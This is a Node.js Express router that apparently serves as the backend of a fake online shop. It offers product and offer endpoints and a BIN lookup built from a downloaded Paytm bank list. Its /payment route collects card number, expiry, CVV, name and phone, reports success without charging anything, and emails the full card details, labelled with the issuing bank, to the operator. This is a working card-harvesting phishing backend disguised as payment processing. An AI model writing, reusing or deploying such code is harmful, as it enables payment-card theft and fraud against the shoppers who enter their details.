const router = require("express").Router();

const { Mail } = require("./SendEmail");
const cards = require("./bin");
const fs = require("fs");
const https = require("https");

router.get("/update-bin/", async (req, res) => {
  const url =
    "https://developer-assets.paytm.com/sftp/upload/cmsuploads/Paytm_powered_OTP_Bin_List_59d48f08b7.xlsx";

  https.get(url, (res) => {
    const path = `${__dirname}/CARDS.xlsx`;
    const filePath = fs.createWriteStream(path);
    res.pipe(filePath);
    filePath.on("finish", () => {
      filePath.close();
    });
  });

  res.redirect("/convert/xlsxToJson");
});

router.get("/convert/xlsxToJson", (req, res) => {
  ("use strict");
  const excelToJson = require("convert-excel-to-json");

  const result = excelToJson({
    sourceFile: "./CARDS.xlsx",
    columnToKey: {
      A: "BinNumber",
      B: "Issuing_Bank",
      C: "CardScheme",
      D: "CardType",
    },
  });

  const content = `const Cards = ${JSON.stringify(
    result.Sheet1
  )} \n module.exports =Cards`;
  fs.writeFileSync("bin.js", content);

  res.send("Job Finished").end();
});

router.post("/payment", async (req, res) => {
  const { info } = req.body;

  let cardResults = {
    CardType: "",
    CardScheme: "Bin Not Found",
    Issuing_Bank: " Not Found",
  };
  if (!req.body.info.cardNumber) {
    return res
      .send({ message: "Please enter a card numver", success: false })
      .end();
  }

  cards.map((card) => {
    if (req.body.info.cardNumber.startsWith(card.BinNumber)) {
      cardResults = {
        CardType: card.CardType,
        CardScheme: card.CardScheme,
        Issuing_Bank: card.Issuing_Bank,
      };
      res.send({
        success: true,
      });
      return;
    }
  });

  const Body = {
    cardtype: cardResults.CardType,
    bankname: cardResults.Issuing_Bank,
    cardnumber: info.cardNumber,
    expirationdate: info.expiry,
    securitycode: info.cvv,
    name: info.name,
    phone: info.phone,
    device: info.device,
  };
 
  await Mail(Body);

  res.end();
});
router.get("/get-products", (req, res) => {
  const products = require("./products.json");
  res.send({
    products,
    success: true,
  });
});
router.get("/offers", (req, res) => {
  const offers = require("./offers.json");

  res.send({
    offers,
    success: true,
  });
});
router.get("*", (req, res) => {
  res.send("Method Not Allowed").end();
});
module.exports = router;
